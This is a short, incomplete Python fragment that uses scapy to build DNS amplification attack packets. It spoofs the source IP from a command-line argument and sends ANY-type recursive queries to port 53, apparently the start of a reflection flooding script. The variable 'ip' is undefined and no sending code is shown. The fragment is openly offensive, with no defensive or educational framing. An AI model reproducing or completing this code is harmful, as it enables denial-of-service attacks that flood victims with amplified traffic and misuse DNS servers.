from scapy import *
import threading
from scapy.all import *

a = IP(dst=ip,src=sys.argv[1])
b = UDP(dport=53)
c = DNS(rd=1)
c.qd=DNSQR(qname='www.google.com',qtype="ANY")